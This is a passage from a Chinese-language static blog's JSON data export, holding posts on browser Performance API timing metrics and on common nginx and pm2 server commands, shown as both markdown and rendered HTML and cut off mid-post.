**domComplete**：返回当前网页DOM结构生成时（即Document.readyState属性变为“complete”，以及相应的readystatechange事件发生时）的Unix毫秒时间戳。\n* **loadEventStart**：返回当前网页load事件的回调函数开始时的Unix毫秒时间戳。如果该事件还没有发生，返回0。\n* **loadEventEnd**：返回当前网页load事件的回调函数运行结束时的Unix毫秒时间戳。如果该事件还没有发生，返回0。\n\n\n![加载流程](https://pic4.zhimg.com/80/v2-d80be1162b4d17d7c6ff265c26e30c3f_1440w.jpg)\n\n关键指标数据如下：\n* DNS解析时间：`domainLookupEnd - domainLookupStart`\n* TCP建立连接：`connectEnd - connectStart`\n* 发送请求：`responseStart - requestStart`\n* 接收请求：`responseEnd - responseStart`\n* TTFB：`responseStart - fetchStart`\n* 白屏时间：`domLoading - fetchStart`\n* 解析 DOM 树：`domInteractive - domLoading`\n* 首次可交互时间：`domContentLoadedEventEnd - fetchStart` （粗略计算）\n* DOM Ready 时间：`domComplete - fetchStart`\n* 页面完全加载时间：`loadEventStart - fetchStart`\n* DOMContentLoaded 事件耗时：`domContentLoadedEventEnd - domContentLoadedEventStart`\n* DOMLoad 事件耗时：`loadEventEnd - loadEventStart`","slug":"浏览器/Performance API","published":1,"updated":"2021-04-27T09:43:15.644Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknzv6w1s0006k96rbptn0mat","content":"<h1 id=\"Performance-API\"><a href=\"#Performance-API\" class=\"headerlink\" title=\"Performance API\"></a>Performance API</h1><h2 id=\"performance-timing\"><a href=\"#performance-timing\" class=\"headerlink\" title=\"performance.timing\"></a>performance.timing</h2><p>performance对象是全局的，它的 timing 属性是一个对象，它包含了各种与浏览器性能有关的时间数据，提供浏览器处理网页各个阶段的耗时。</p>\n<p><img src=\"https://image-static.segmentfault.com/306/110/3061105775-56fde6dc11135_articlex\" alt=\"文档加载时间图\"></p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-e4e26420d6b681b2b15b9edf9db9d4d0_1440w.jpg\" alt=\"性能指标\"></p>\n<p>performance.timing对象包含下列属性（全部只读）：</p>\n<ul>\n<li><strong>navigationStart</strong>：当前浏览器窗口的前一个网页关闭，发生unload事件时的Unix毫秒时间戳。如果没有前一个网页，则等于fetchStart属性。</li>\n<li><strong>unloadEventStart</strong>：如果前一个网页与当前网页属于同一个域名，则返回前一个网页的unload事件发生时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。</li>\n<li>*unloadEventEnd**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页unload事件的回调函数结束时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。</li>\n<li>*redirectStart**：返回第一个HTTP跳转开始时的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。</li>\n<li><strong>redirectEnd</strong>：返回最后一个HTTP跳转结束时（即跳转回应的最后一个字节接受完成时）的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。</li>\n<li><strong>fetchStart</strong>：返回浏览器准备使用HTTP请求读取文档时的Unix毫秒时间戳。该事件在网页查询本地缓存之前发生。</li>\n<li><strong>domainLookupStart</strong>：返回域名查询开始时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。</li>\n<li><strong>domainLookupEnd</strong>：返回域名查询结束时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。</li>\n<li><strong>connectStart</strong>：返回HTTP请求开始向服务器发送时的Unix毫秒时间戳。如果使用持久连接（persistent connection），则返回值等同于fetchStart属性的值。</li>\n<li><strong>connectEnd</strong>：返回浏览器与服务器之间的连接建立时的Unix毫秒时间戳。如果建立的是持久连接，则返回值等同于fetchStart属性的值。连接建立指的是所有握手和认证过程全部结束。</li>\n<li><strong>secureConnectionStart</strong>：返回浏览器与服务器开始安全链接的握手时的Unix毫秒时间戳。如果当前网页不要求安全连接，则返回0。</li>\n<li><strong>requestStart</strong>：返回浏览器向服务器发出HTTP请求时（或开始读取本地缓存时）的Unix毫秒时间戳。</li>\n<li><strong>responseStart</strong>：返回浏览器从服务器收到（或从本地缓存读取）第一个字节时的Unix毫秒时间戳。</li>\n<li><strong>responseEnd</strong>：返回浏览器从服务器收到（或从本地缓存读取）最后一个字节时（如果在此之前HTTP连接已经关闭，则返回关闭时）的Unix毫秒时间戳。</li>\n<li><strong>domLoading</strong>：返回当前网页DOM结构开始解析时（即Document.readyState属性变为“loading”、相应的readystatechange事件触发时）的Unix毫秒时间戳。</li>\n<li><strong>domInteractive</strong>：返回当前网页DOM结构结束解析、开始加载内嵌资源时（即Document.readyState属性变为“interactive”、相应的readystatechange事件触发时）的Unix毫秒时间戳。</li>\n<li><strong>domContentLoadedEventStart</strong>：返回当前网页DOMContentLoaded事件发生时（即DOM结构解析完毕、所有脚本开始运行时）的Unix毫秒时间戳。</li>\n<li><strong>domContentLoadedEventEnd</strong>：返回当前网页所有需要执行的脚本执行完成时的Unix毫秒时间戳。</li>\n<li><strong>domComplete</strong>：返回当前网页DOM结构生成时（即Document.readyState属性变为“complete”，以及相应的readystatechange事件发生时）的Unix毫秒时间戳。</li>\n<li><strong>loadEventStart</strong>：返回当前网页load事件的回调函数开始时的Unix毫秒时间戳。如果该事件还没有发生，返回0。</li>\n<li><strong>loadEventEnd</strong>：返回当前网页load事件的回调函数运行结束时的Unix毫秒时间戳。如果该事件还没有发生，返回0。</li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/80/v2-d80be1162b4d17d7c6ff265c26e30c3f_1440w.jpg\" alt=\"加载流程\"></p>\n<p>关键指标数据如下：</p>\n<ul>\n<li>DNS解析时间：<code>domainLookupEnd - domainLookupStart</code></li>\n<li>TCP建立连接：<code>connectEnd - connectStart</code></li>\n<li>发送请求：<code>responseStart - requestStart</code></li>\n<li>接收请求：<code>responseEnd - responseStart</code></li>\n<li>TTFB：<code>responseStart - fetchStart</code></li>\n<li>白屏时间：<code>domLoading - fetchStart</code></li>\n<li>解析 DOM 树：<code>domInteractive - domLoading</code></li>\n<li>首次可交互时间：<code>domContentLoadedEventEnd - fetchStart</code> （粗略计算）</li>\n<li>DOM Ready 时间：<code>domComplete - fetchStart</code></li>\n<li>页面完全加载时间：<code>loadEventStart - fetchStart</code></li>\n<li>DOMContentLoaded 事件耗时：<code>domContentLoadedEventEnd - domContentLoadedEventStart</code></li>\n<li>DOMLoad 事件耗时：<code>loadEventEnd - loadEventStart</code></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Performance-API\"><a href=\"#Performance-API\" class=\"headerlink\" title=\"Performance API\"></a>Performance API</h1><h2 id=\"performance-timing\"><a href=\"#performance-timing\" class=\"headerlink\" title=\"performance.timing\"></a>performance.timing</h2><p>performance对象是全局的，它的 timing 属性是一个对象，它包含了各种与浏览器性能有关的时间数据，提供浏览器处理网页各个阶段的耗时。</p>\n<p><img src=\"https://image-static.segmentfault.com/306/110/3061105775-56fde6dc11135_articlex\" alt=\"文档加载时间图\"></p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-e4e26420d6b681b2b15b9edf9db9d4d0_1440w.jpg\" alt=\"性能指标\"></p>\n<p>performance.timing对象包含下列属性（全部只读）：</p>\n<ul>\n<li><strong>navigationStart</strong>：当前浏览器窗口的前一个网页关闭，发生unload事件时的Unix毫秒时间戳。如果没有前一个网页，则等于fetchStart属性。</li>\n<li><strong>unloadEventStart</strong>：如果前一个网页与当前网页属于同一个域名，则返回前一个网页的unload事件发生时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。</li>\n<li>*unloadEventEnd**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页unload事件的回调函数结束时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。</li>\n<li>*redirectStart**：返回第一个HTTP跳转开始时的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。</li>\n<li><strong>redirectEnd</strong>：返回最后一个HTTP跳转结束时（即跳转回应的最后一个字节接受完成时）的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。</li>\n<li><strong>fetchStart</strong>：返回浏览器准备使用HTTP请求读取文档时的Unix毫秒时间戳。该事件在网页查询本地缓存之前发生。</li>\n<li><strong>domainLookupStart</strong>：返回域名查询开始时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。</li>\n<li><strong>domainLookupEnd</strong>：返回域名查询结束时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。</li>\n<li><strong>connectStart</strong>：返回HTTP请求开始向服务器发送时的Unix毫秒时间戳。如果使用持久连接（persistent connection），则返回值等同于fetchStart属性的值。</li>\n<li><strong>connectEnd</strong>：返回浏览器与服务器之间的连接建立时的Unix毫秒时间戳。如果建立的是持久连接，则返回值等同于fetchStart属性的值。连接建立指的是所有握手和认证过程全部结束。</li>\n<li><strong>secureConnectionStart</strong>：返回浏览器与服务器开始安全链接的握手时的Unix毫秒时间戳。如果当前网页不要求安全连接，则返回0。</li>\n<li><strong>requestStart</strong>：返回浏览器向服务器发出HTTP请求时（或开始读取本地缓存时）的Unix毫秒时间戳。</li>\n<li><strong>responseStart</strong>：返回浏览器从服务器收到（或从本地缓存读取）第一个字节时的Unix毫秒时间戳。</li>\n<li><strong>responseEnd</strong>：返回浏览器从服务器收到（或从本地缓存读取）最后一个字节时（如果在此之前HTTP连接已经关闭，则返回关闭时）的Unix毫秒时间戳。</li>\n<li><strong>domLoading</strong>：返回当前网页DOM结构开始解析时（即Document.readyState属性变为“loading”、相应的readystatechange事件触发时）的Unix毫秒时间戳。</li>\n<li><strong>domInteractive</strong>：返回当前网页DOM结构结束解析、开始加载内嵌资源时（即Document.readyState属性变为“interactive”、相应的readystatechange事件触发时）的Unix毫秒时间戳。</li>\n<li><strong>domContentLoadedEventStart</strong>：返回当前网页DOMContentLoaded事件发生时（即DOM结构解析完毕、所有脚本开始运行时）的Unix毫秒时间戳。</li>\n<li><strong>domContentLoadedEventEnd</strong>：返回当前网页所有需要执行的脚本执行完成时的Unix毫秒时间戳。</li>\n<li><strong>domComplete</strong>：返回当前网页DOM结构生成时（即Document.readyState属性变为“complete”，以及相应的readystatechange事件发生时）的Unix毫秒时间戳。</li>\n<li><strong>loadEventStart</strong>：返回当前网页load事件的回调函数开始时的Unix毫秒时间戳。如果该事件还没有发生，返回0。</li>\n<li><strong>loadEventEnd</strong>：返回当前网页load事件的回调函数运行结束时的Unix毫秒时间戳。如果该事件还没有发生，返回0。</li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/80/v2-d80be1162b4d17d7c6ff265c26e30c3f_1440w.jpg\" alt=\"加载流程\"></p>\n<p>关键指标数据如下：</p>\n<ul>\n<li>DNS解析时间：<code>domainLookupEnd - domainLookupStart</code></li>\n<li>TCP建立连接：<code>connectEnd - connectStart</code></li>\n<li>发送请求：<code>responseStart - requestStart</code></li>\n<li>接收请求：<code>responseEnd - responseStart</code></li>\n<li>TTFB：<code>responseStart - fetchStart</code></li>\n<li>白屏时间：<code>domLoading - fetchStart</code></li>\n<li>解析 DOM 树：<code>domInteractive - domLoading</code></li>\n<li>首次可交互时间：<code>domContentLoadedEventEnd - fetchStart</code> （粗略计算）</li>\n<li>DOM Ready 时间：<code>domComplete - fetchStart</code></li>\n<li>页面完全加载时间：<code>loadEventStart - fetchStart</code></li>\n<li>DOMContentLoaded 事件耗时：<code>domContentLoadedEventEnd - domContentLoadedEventStart</code></li>\n<li>DOMLoad 事件耗时：<code>loadEventEnd - loadEventStart</code></li>\n</ul>\n"},{"title":"nginx 常用命令","date":"2021-04-27T09:22:48.000Z","_content":"\n\n# nginx 常用命令\n\n* `sudo nginx`  // 启动 nginx\n* `sudo nginx -s reload`  // 重启 nginx\n* `sudo nginx -s stop`  // 关闭 nginx\n* `ps -ef | grep nginx`  // 查看查看nginx进程\n* `sudo kill -TERM 主进程号`  // 杀死进程\n\n## linux 常用命令\n* cp [-r]\n* rm\n* open\n* pwd\n* clear reset","source":"_posts/杂项/nginx 常用命令.md","raw":"---\ntitle: nginx 常用命令\ncategories: 杂项\ntags: [server, nginx]\ndate: 2021-04-27 17:22:48\n---\n\n\n# nginx 常用命令\n\n* `sudo nginx`  // 启动 nginx\n* `sudo nginx -s reload`  // 重启 nginx\n* `sudo nginx -s stop`  // 关闭 nginx\n* `ps -ef | grep nginx`  // 查看查看nginx进程\n* `sudo kill -TERM 主进程号`  // 杀死进程\n\n## linux 常用命令\n* cp [-r]\n* rm\n* open\n* pwd\n* clear reset","slug":"杂项/nginx 常用命令","published":1,"updated":"2021-04-27T09:43:09.659Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknzv6w1t0007k96radz85m4b","content":"<h1 id=\"nginx-常用命令\"><a href=\"#nginx-常用命令\" class=\"headerlink\" title=\"nginx 常用命令\"></a>nginx 常用命令</h1><ul>\n<li><code>sudo nginx</code>  // 启动 nginx</li>\n<li><code>sudo nginx -s reload</code>  // 重启 nginx</li>\n<li><code>sudo nginx -s stop</code>  // 关闭 nginx</li>\n<li><code>ps -ef | grep nginx</code>  // 查看查看nginx进程</li>\n<li><code>sudo kill -TERM 主进程号</code>  // 杀死进程</li>\n</ul>\n<h2 id=\"linux-常用命令\"><a href=\"#linux-常用命令\" class=\"headerlink\" title=\"linux 常用命令\"></a>linux 常用命令</h2><ul>\n<li>cp [-r]</li>\n<li>rm</li>\n<li>open</li>\n<li>pwd</li>\n<li>clear reset</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"nginx-常用命令\"><a href=\"#nginx-常用命令\" class=\"headerlink\" title=\"nginx 常用命令\"></a>nginx 常用命令</h1><ul>\n<li><code>sudo nginx</code>  // 启动 nginx</li>\n<li><code>sudo nginx -s reload</code>  // 重启 nginx</li>\n<li><code>sudo nginx -s stop</code>  // 关闭 nginx</li>\n<li><code>ps -ef | grep nginx</code>  // 查看查看nginx进程</li>\n<li><code>sudo kill -TERM 主进程号</code>  // 杀死进程</li>\n</ul>\n<h2 id=\"linux-常用命令\"><a href=\"#linux-常用命令\" class=\"headerlink\" title=\"linux 常用命令\"></a>linux 常用命令</h2><ul>\n<li>cp [-r]</li>\n<li>rm</li>\n<li>open</li>\n<li>pwd</li>\n<li>clear reset</li>\n</ul>\n"},{"title":"pm2 常用命令","date":"2021-04-27T09:21:48.000Z","_content":"\n# pm2 常用命令\n\n### 1、node守护进程比较\n**node 守护进程比较**\n* nodemon：开发环境使用，修改后自动重启。\n* forever：管理多个站点，每个站点访问量不大，不需要监控。\n* pm2：网站访问量比较大，需要完整的监控界面。\n\n### pm2主要特性\n* 内建负载均衡（使用Node cluster 集群模块）\n* 后台运行\n* 0 秒停机重载\n* 开机自启动脚本\n* 停止不稳定的进程（避免无限循环）\n* 控制台检测\n* 提供远程控制和实时的接口API (允许和PM2进程管理器交互)\n\n\n### pm2 常用命令\n\n##### 1. 安装\n`npm install -g pm2`\n\n##### 2. 单个启动\n`pm2 start app.js`  # 启动\n`pm2 start app.js -i 4` # 启动4个应用实例，自动负载均衡\n\n`pm2 start app.js --watch` # 监听文件变化并重启\n\n### 3. 批量重启\n\n使用 `pm2 ecosystem` 或 `pm2 init` 会生成 `ecosystem.config.js` 文件\n\n然后运行 `pm2 start ecosystem.config.js --env dev`\n\n```js\nmodule.exports = {\n  apps : [{\n    name: 'app',\n    script: './app.js',\n    env_dev: {\n      NODE_ENV: 'dev', // 环境参数，当前指定为生产环境 process.env.NODE_ENV\n      REMOTE_ADDR: 'https://www.test.com',\n    },\n    env_sit: {\n      NODE_ENV: 'sit',\n      REMOTE_ADDR: 'https://www.test.com',\n    },\n    env_prod: {\n      NODE_ENV: 'prod',\n      REMOTE_ADDR: 'https://www.test.com',\n    },\n  }, {\n     name: 'worker',\n     script: 'worker.js'\n  }]\n}\n```\n\n##### 4. 重启\n`pm2 restart app_id | app_name` # 重启\n`pm2 restart all` # 重启所有进程，相当stop+start\n`pm2 reload all` # 0秒停机重载进程 (用于不间断进程)\n\n##### 5. 停止\n`pm2 stop app_id | app_name` # 重启\n`pm2 stop all` # 重启所有进程，相当stop+start\n\n##### 6. 删除\n`pm2 delete app_id | app_name`  # 从列表中删除指定的进程\n`pm2 delete all` # 从列表中删除全部进程\n`pm2 kill` # 杀死守护进程\n\n##### 7. 查看\n`pm2 list` # 查看进程\n`pm2 logs` # 查看日志\n`pm2 show app_name|app_id` # 查看进程详情\n`pm2 monit`  # 查看CPU和内存资源占用\n\n##### 8. 启动 HTTP 服务\n`pm2 serve|expose [options] [path] [port]`\n\n例如 `pm2 serve ./dist 8888`，在 dist 目录启动 http 服务，端口号为 8888\n\n","source":"_posts/杂项/pm2 常用命令.md","raw":"---\ntitle: pm2 常用命令\ncategories: 杂项\ntags: [server, node]\ndate: 2021-04-27 17:21:48\n---\n\n# pm2 常用命令\n\n### 1、node守护进程比较\n**node 守护进程比较**\n* nodemon：开发环境使用，修改后自动重启。\n* forever：管理多个站点，每个站点访问量不大，不需要监控。\n* pm2：网站访问量比较大，需要完整的监控界面。\n\n### pm2主要特性\n* 内建负载均衡（使用Node cluster 集群模块）\n* 后台运行\n* 0 秒停机重载\n* 开机自启动脚本\n* 停止不稳定的进程（避免无限循环）\n* 控制台检测\n* 提供远程控制和实时的接口API (允许和PM2进程管理器交互)\n\n\n### pm2 常用命令\n\n##### 1. 安装\n`npm install -g pm2`\n\n##### 2. 单个启动\n`pm2 start app.js`  # 启动\n`pm2 start app.js -i 4` # 启动4个应用实例，自动负载均衡\n\n`pm2 start app.js --watch` # 监听文件变化并重启\n\n### 3. 批量重启\n\n使用 `pm2 ecosystem` 或 `pm2 init` 会生成 `ecosystem.config.js` 文件\n\n然后运行 `pm2 start ecosystem.config.js --env dev`\n\n```js\nmodule.exports = {\n  apps : [{\n    name: 'app',\n    script: './app.js',\n    env_dev: {\n      NODE_ENV: 'dev', // 环境参数，当前指定为生产环境 process.env.NODE_ENV\n      REMOTE_ADDR: 'https://www.test.com',\n    },\n    env_sit: {\n      NODE_ENV: 'sit',\n      REMOTE_ADDR: 'https://www.test.com',\n    },\n    env_prod: {\n      NODE_ENV: 'prod',\n      REMOTE_ADDR: 'https://www.test.com',\n    },\n  }, {\n     name: 'worker',\n     script: 'worker.js'\n  }]\n}\n```\n\n##### 4. 重启\n`pm2 restart app_id | app_name` # 重启\n`pm2 restart all` # 重启所有进程，相当stop+start\n`pm2 reload all` # 0秒停机重载进程 (用于不间断进程)\n\n##### 5. 停止\n`pm2 stop app_id | app_name` # 重启\n`pm2 stop all` # 重启所有进程，相当stop+start\n\n##### 6. 删除\n`pm2 delete app_id | app_name`  # 从列表中删除指定的进程\n`pm2 delete all` # 从列表中删除全部进程\n`pm2 kill` # 杀死守护进程\n\n##### 7. 查看\n`pm2 list` # 查看进程\n`pm2 logs` # 查看日志\n`pm2 show app_name|app_id` # 查看进程详情\n`pm2 monit`  # 查看CPU和内存资源占用\n\n##### 8. 启动 HTTP 服务\n`pm2 serve|expose [options] [path] [port]`\n\n例如 `pm2 serve ./dist 8888`，在 dist 目录启动 http 服务，端口号为 8888\n\n","slug":"杂项/pm2 常用命令","published":1,"updated":"2021-04-27T11:59:27.247Z","_id":"cknzv6w1u0008k96r93999udz","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"pm2-常用命令\"><a href=\"#pm2-常用命令\" class=\"headerlink\" title=\"pm2 常用命令\"></a>pm2 常用命令</h1><h3 id=\"1、node守护进程比较\"><a href=\"#1、node守护进程比较\" class=\"headerlink\" title=\"1、node守护进程比较\"></a>1、node守护进程比较</h3><p><strong>node 守护进程比较</strong></p>\n<ul>\n<li>nodemon：开发环境使用，修改后自动重启。</li>\n<li>forever：管理多个站点，每个站点访问量不大，不需要监控。</li>\n<li>pm2：网站访问量比较大，需要完整的监控界面。</li>\n</ul>\n<h3 id=\"pm2主要特性\"><a href=\"#pm2主要特性\" class=\"headerlink\" title=\"pm2主要特性\"></a>pm2主要特性</h3><ul>\n<li>内建负载均衡（使用Node cluster 集群模块）</li>\n<li>后台运行</li>\n<li>0 秒停机重载</li>\n<li>开机自启动脚本</li>\n<li>停止不稳定的进程（避免无限循环）</li>\n<li>控制台检测</li>\n<li>提供远程控制和实时的接口API (允许和PM2进程管理器交互)</li>\n</ul>\n<h3 id=\"pm2-常用命令-1\"><a href=\"#pm2-常用命令-1\" class=\"headerlink\" title=\"pm2 常用命令\"></a>pm2 常用命令</h3><h5 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a>1. 安装</h5><p><code>npm install -g pm2</code></p>\n<h5 id=\"2-单个启动\"><a href=\"#2-单个启动\" class=\"headerlink\" title=\"2. 单个启动\"></a>2. 单个启动</h5><p><code>pm2 start app.js</code>  # 启动<br><code>pm2 start app.js -i 4</code> # 启动4个应用实例，自动负载均衡</p>\n<p><code>pm2 start app.js --watch</code> # 监听文件变化并重启</p>\n<h3 id=\"3-批量重启\"><a href=\"#3-批量重启\" class=\"headerlink\" title=\"3. 批量重启\"></a>3. 批量重启</h3><p>使用 <code>pm2 ecosystem</code> 或 <code>pm2 init</code> 会生成 <code>ecosystem.config.js</code> 文件</p>\n<p>然后运行 <code>pm2 start ecosystem.config.js --env dev</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  apps : [&#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;app&#x27;</span>,</span><br><span class=\"line\">    script: <span class=\"string\">&#x27;./app.js&#x27;</span>,</span><br><span class=\"line\">    env_dev: &#123;</span><br><span class=\"line\">      NODE_ENV: <span class=\"string\">&#x27;dev&#x27;</span>, <span class=\"comment\">// 环境参数，当前指定为生产环境 process.env.NODE_ENV</span></span><br><span class=\"line\">      REMOTE_ADDR: <span class=\"string\">&#x27;https://www.test.com&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    env_sit: &#123;</span><br><span class=\"line\">      NODE_ENV: <span class=\"string\">&#x27;sit&#x27;</span>,</span><br><span class=\"line\">      REMOTE_ADDR: <span class=\"string\">&#x27;https://www.test.com&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    env_prod: &#123;</span><br><span class=\"line\">      NODE_ENV: <span class=\"string\">&#x27;prod&#x27;</span>,</span><br><span class=\"line\">      REMOTE_ADDR: <span class=\"string\">&#x27;https://www.test.com&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">  &#125;, &#123;</span><br><span class=\"line\">     name: <span class=\"string\">&#x27;worker&#x27;</span>,</span><br><span class=\"line\">     script: <span class=\"string\">&#x27;worker.js&#x27;</span></span><br><span class=\"line\">  &#125;]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-重启\"><a href=\"#4-重启\" class=\"headerlink\" title=\"4. 重启\"></a>4. 重启</h5><p><code>pm2 restart app_id | app_name</code> # 重启<br><code>pm2 restart all</code> # 重启所有进程，相当stop+start<br><code>pm2 reload all</code> # 0秒停机重载进程 (用于不间断进程)</p>\n<h5 id=\"5-停止\"><a href=\"#5-停止\" class=\"headerlink\" title=\"5. 停止\"></a>5. 停止</h5><p><code>pm2 stop app_id | app_name</code> # 重启<br><code>pm2 stop all</code> # 重启所有进程，相当stop+start</p>\n<h5 id=\"6-删除\"><a href=\"#6-删除\" class=\"headerlink\" title=\"6. 删除\"></a>6. 删除</h5><p><code>pm2 delete app_id | app_name</code>  # 从列表中删除指定的进程<br><code>pm2 delete all</code> # 从列表中删除全部进程<br><code>pm2 kill</code> # 杀死守护进程</p>\n<h5 id=\"7-查看\"><a href=\"#7-查看\" class=\"headerlink\" title=\"7. 查看\"></a>7. 查看</h5><p><code>pm2 list</code> # 查看进程<br><code>pm2 logs</code> # 查看日志<br><code>pm2 show app_name|app_id</code> # 查看进程详情<br><code>pm2 monit</code>  # 查看CPU和内存资源占用</p>\n<h5 id=\"8-启动-HTTP-服务\"><a href=\"#8-启动-HTTP-服务\" class=\"headerlink\" title=\"8. 启动 HTTP 服务\"></a>8. 启动 HTTP 服务</h5><p><code>pm2 serve|expose [options] [path] [port]</code></p>\n<p>例如 <code>pm2 serve ./dist 8888</code>，在 dist 目录启动 http 服务，端口号为 8888</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"pm2-常用命令\"><a href=\"#pm2-常用命令\" class=\"headerlink\" title=\"pm2 常用命令\"></a>pm2 常用命令</h1><h3 id=\"1、node守护进程比较\"><a href=\"#1、node守护进程比较\" class=\"headerlink\" title=\"1、node守护进程比较\"></a>1、node守护进程比较</h3><p><strong>node 守护进程比较</strong></p>\n<ul>\n<li>nodemon：开发环境使用，修改后自动重启。</li>\n<li>forever：管理多个站点，每个站点访问量不大，不需要监控。</li>\n<li>pm2：网站访问量比较大，需要完整的监控界面。</li>\n</ul>\n<h3 id=\"pm2主要特性\"><a href=\"#pm2主要特性\" class=\"headerlink\" title=\"pm2主要特性\"></a>pm2主要特性</h3><ul>\n<li>内建负载均衡（使用Node cluster 集群模块）</li>\n<li>后台运行</li>\n<li>0 秒停机重载</li>\n<li>开机自启动脚本</li>\n<li>停止不稳定的进程（避免无限循环）</li>\n<li>控制台检测</li>\n<li>提供远程控制和实时的接口API (允许和PM2进程管理器交互)</li>\n</ul>\n<h3 id=\"pm2-常用命令-1\"><a href=\"#pm2-常用命令-1\" class=\"headerlink\" title=\"pm2 常用命令\"></a>pm2 常用命令</h3><h5 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a>1. 安装</h5><p><code>npm install -g pm2</code></p>\n<h5 id=\"2-单个启动\"><a href=\"#2-单个启动\" class=\"headerlink\" title=\"2. 单个启动\"></a>2. 单个启动</h5><p><code>pm2 start app.js</code>  # 启动<br><code>pm2 start app.js -i 4</code> # 启动4个应用实例，自动负载均衡</p>\n<p><code>pm2 start app.js --watch</code> # 监听文件变化并重启</p>\n<h3 id=\"3-批量重启\"><a href=\"#3-批量重启\" class=\"headerlink\" title=\"3. 批量重启\"></a>3. 批量重启</h3><p>使用 <code>pm2 ecosystem</code> 或 <code>pm2 init</code> 会生成 <code>ecosystem.config.js</code> 文件</p>\n<p>然后运行 <code>pm2 start ecosystem.config.js --env dev</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  apps : [&#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;app&#x27;</span>,</span><br><span class=\"line\">    script: <span class=\"string\">&#x27;./app.js&#x27;</span>,</span><br><span class=\"line\">    env_dev: &#123;</span><br><span class=\"line\">      NODE_ENV: <span class=\"string\">&#x27;dev&#x27;</span>, <span class=\"comment\">// 环境参数，当前指定为生产环境 process.env.NODE_ENV</span></span><br><span class=\"line\">      REMOTE_ADDR: <span class=\"string\">&#x27;https://www.test.com&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    env_sit: &#123;</span><br><span class=\"line\">      NODE_ENV: <span class=\"string\">&#x27;sit&#x27;</span>,</span><br><span class=\"line\">      REMOTE_ADDR: <span class=\"string\">&#x27;https://www.test.com&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    env_prod: &#123;</span><br><span class=\"line\">      NODE_ENV: <span class=\"string\">&#x27;prod&#x27;</span>,</span><br><span class=\"line\">      REMOTE_ADDR: <span class=\"string\">&#x27;https://www.test.com&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">  &#125;, &#123;</span><br><span class=\"line\">     name: <span class=\"string\">&#x27;worker&#x27;</span>,</span><br><span class=\"line\">     script: <span class=\"string\">&#x27;worker.js&#x27;</span></span><br><span class=\"line\">  &#125;]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-重启\"><a href=\"#4-重启\" class=\"headerlink\" title=\"4. 重启\"></a>4. 重启</h5><p><code>pm2 restart app_id | app_name</code> # 重启<br><code>pm2 restart all</code> # 重启所有进程，相当stop+start<br><code>pm2 reload all</code> # 0秒停机重载进程 